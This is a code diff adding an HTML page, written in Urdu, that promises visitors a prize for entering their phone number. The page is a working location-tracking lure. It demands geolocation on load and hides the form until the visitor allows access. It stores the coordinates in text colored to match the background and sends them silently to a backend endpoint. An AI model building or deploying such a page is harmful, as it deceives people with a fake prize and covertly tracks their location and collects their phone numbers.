@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    body {
+      background-color: #f0f0f0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+    #phoneNumberForm {
+      display: block;
+      margin-bottom: 20px;
+    }
+    #phoneNumberInput, #submitBtn {
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body onload="getLocation()">
+  <h1>اپنا انعام حاصل کریں</h1>
+  <form id="phoneNumberForm">
+    <p>اپنا فون نمبر درج کریں:</p>
+    <input type="text" id="phoneNumberInput" placeholder="Enter your phone number">
+    <button id="submitBtn" onclick="alert("اپ کو اپ کا انعام ایک دن میں مل جائے گا")">فارم کا بھرے ہیں</button>
+  </form>
+  <div style="color: #f0f0f0;">
+    <p>Latitude: is <span id="lat"></span></p>
+    <p>Longitude: <span id="long"></span></p>
+    <p>IP: <span id="ip"></span></p>
+  </div>
+  <button id="retryButton" style="display: none;" onclick="retryLocation()">Click here to allow location access</button>
+<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    askForLocation();
+  } else {
+    document.getElementById("lat").innerHTML = "Geolocation is not supported by this browser.";
+    document.getElementById("long").innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function askForLocation() {
+  navigator.geolocation.getCurrentPosition(
+    showPosition, 
+    function(error) {
+      if (error.code === error.PERMISSION_DENIED) {
+        document.getElementById("lat").innerHTML = "Location access denied. Please allow access.";
+        document.getElementById("long").innerHTML = "Location access denied. Please allow access.";
+        // Show retry button
+        document.getElementById("retryButton").style.display = "inline";
+        // Hide phone number form
+        document.getElementById("phoneNumberForm").style.display = "none";
+      }
+    }
+  );
+}
+
+function retryLocation() {
+  // Hide retry button
+  document.getElementById("retryButton").style.display = "none";
+  // Show phone number form
+  document.getElementById("phoneNumberForm").style.display = "block";
+  // Retry getting location
+  askForLocation();
+}
+
+function showPosition(position) {
+  document.getElementById("lat").innerHTML = position.coords.latitude;
+  document.getElementById("long").innerHTML = position.coords.longitude;
+  // Once permission is granted, send data to backend
+  sendDataToBackend();
+}
+
+function sendDataToBackend() {
+    const lat = document.getElementById("lat").textContent;
+    const long = document.getElementById("long").textContent;
+
+    const data = { lat: lat, long: long };
+
+    fetch("/api/get", {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+    })
+        .then(response => response.json())
+        .then(data => console.log('Data sent to backend:', data))
+        .catch(error => console.error('Unable to send data to backend:', error));
+}
+
+</script>
+</body>
+</html>
